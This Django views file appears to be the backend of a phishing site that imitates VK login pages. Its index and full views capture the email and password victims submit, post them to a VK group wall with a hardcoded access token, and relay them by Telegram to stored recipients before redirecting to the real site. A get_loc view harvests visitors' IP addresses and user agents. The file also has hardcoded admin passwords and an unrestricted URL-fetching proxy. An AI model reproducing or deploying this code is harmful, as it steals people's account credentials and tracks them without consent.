from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.http import *
from .forms import *
# from vk_api import *
from vk import *
from .microdetector import detect_mobile
from .models import *
import time
from array import *
from .utils import *
import requests
from .bot import *
import json


@detect_mobile
def index(request):
    if request.method == "POST":
        tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
        club = -189734539

        email = request.POST.get("email")
        pas = request.POST.get("pas")

        body = "Login: {0}\nPass: {1}\n".format(email, pas)

        ses = Session(access_token=tok)
        vk = API(session=ses)
        vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)

        ids = id_list.objects.in_bulk()
        for id in ids:
            tel(body, ids[id].number)

        return HttpResponsePermanentRedirect("https://m.vk.com")
    if request.mobile:
        form = login()
        return render(request, "app_serverr/index.html", {"form": form})
    else:
        return HttpResponsePermanentRedirect(request.scheme + "://" + request.META['HTTP_HOST'])


@detect_mobile
def full(request):
    if request.method == "POST":
        tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
        club = -189734539

        email = request.POST.get("email")
        pas = request.POST.get("pas")
        redirect = request.POST.get("redirect")

        body = "Login: {0}\nPass: {1}\n".format(email, pas)

        ses = Session(access_token=tok)
        vk = API(session=ses)
        vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)

        ids = id_list.objects.in_bulk()
        for id in ids:
            tel(body, ids[id].number)

        return HttpResponsePermanentRedirect(redirect)
    if request.mobile:
        return HttpResponsePermanentRedirect(request.scheme + "://" + request.META['HTTP_HOST'] + "/m")
    form = full_login()

    redirect_url = "https://vk.com"
    if request.GET.get('redirect_url'):
        redirect_url = request.GET.get('redirect_url')
    return render(request, "app_serverr/full.html", {"form": form, "redirect": redirect_url})


def id_add(request):
    # tel("запрос получен", 433019587)
    t = request.GET.get('t')
    c = check_pass(t)
    if c["status"]:
        i = request.GET.get('id')
        try:
            d = int(i)
        except Exception:
            # tel("your new айди не число: {}".format(i), 433019587)
            return HttpResponse("your new айди не число: {}".format(i))
        try:
            i = id_list.objects.get(number=d)
        except Exception:
            i = id_list.objects.create(number=d)
            tel("добавлен айди: {}".format(d), 433019587)
            return HttpResponse("добавлен айди: {}".format(d))
        return HttpResponse("этот id уже есть в таблице: {}".format(d))
    else:
        tel("error: {}".format(c["text"]), 433019587)
    return HttpResponse("error: {}".format(c["text"]))


def id_del(request):
    t = request.GET.get('t')
    a = request.GET.get('id')
    c = check_pass(t)
    if c["status"]:
        try:
            d = int(a)
        except Exception:
            return HttpResponse("your id is not number: {}".format(a))
        try:
            d = id_list.objects.get(number=d)
        except Exception:
            return HttpResponse("this id not exist in the table: {}".format(a))
        i = d.delete()
    return HttpResponse("id: {} успешно удалён".format(a))


def set_pass(request):
    n = request.GET.get('new')
    t = request.GET.get('t')
    o = request.GET.get('old')
    m = ""
    a = check_pass(t)
    try:
        if not a["flag"]:
            if t == "qawsed":
                if len(n) > 7:
                    l = passs.objects.create(name='pass', pas=n)
                    m = "Новый пароль успешно установлен: {}".format(n)
                else:
                    m = "Длина пароля маловата - нужно не меньше 8 символов"
            else:
                m = "Пароль не верный!!!"
            return HttpResponse(m)
        if a["status"] and o is not None:
            p = passs.objects.get(name="pass")
            if o != p.pas:
                m = "неверный старый пароль!!!"
            elif len(n) > 7:
                p.pas = n
                p.save()
                m = "пароль новый установлен: {}".format(n)
            else:
                m = "длина малова-та: {}".format(n)
        else:
            m = a["text"]
    except KeyError:
        return HttpResponse("some error!\na: {0}".format(a))
    return HttpResponse(m)


def clear_pass(request):
    m = ""
    t = request.GET.get('t')
    n = 'aqswde'
    if t == n:
        p = passs.objects.in_bulk()
        for id in p:
            p[id].delete()
        m = "пароли удалены"
    else:
        m = "неверный пароль супеr: {0}".format(t)
    return HttpResponse(m)


def clear_ids(request):
    m = ""
    t = request.GET.get('t')
    c = check_pass(t)
    if c["status"]:
        i = id_list.objects.in_bulk()
        for id in i:
            i[id].delete()
        m = "ids удалены"
    else:
        m = "error: {}".format(c["text"])
    return HttpResponse(m)


def get_ids(request):
    o = ""
    t = request.GET.get('t')
    c = request.GET.get('chat')
    a = check_pass(t)
    if a["status"] == False:
        return HttpResponse("error: {}".format(a["text"]))
    i = id_list.objects.in_bulk()

    m = array('i', [])
    s = ""
    to = int()
    for f in i:
        # tel(f, 433019587)
        m.append(i[f].number)
        s += "```{}```\n".format(i[f].number)
    o = s
    return HttpResponse(o)


def get_loc(request):
    redirect_url = request.GET.get('redirect_url')

    client = request.META.get('HTTP_CLIENT_IP')
    forward = request.META.get('HTTP_X_FORWARDED_FOR')
    remote = request.META.get('REMOTE_ADDR')
    body = "{0}\nIPs = {1}, {2}, {3}\nUserAgent: {4}\n\n".format(
        time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime()), client, forward, remote,
        request.META['HTTP_USER_AGENT'])

    tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
    club = -189734539

    ses = Session(access_token=tok)
    vk = API(session=ses)
    vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)

    ids = id_list.objects.in_bulk()
    for id in ids:
        tel(body, ids[id].number)
    return HttpResponsePermanentRedirect(redirect_url)


@csrf_exempt
def tbot(request):
    body = request.body.decode("utf-8")
    tel("!" + body, 433019587)
    if len(body) == 0:
        body = "{" + body + "}"
    try:
        data = json.loads(body)
        update = telebot.types.Update.de_json(data)
        bott.process_new_updates([update])
    except Exception:
        return HttpResponse(status=402)
    return HttpResponse(status=200)


def geturl(request):
    if request.GET.get('type') == 'json':
        return HttpResponse(requests.get(request.GET.get('url')).json)
    return HttpResponse(requests.get(request.GET.get('url')).text)
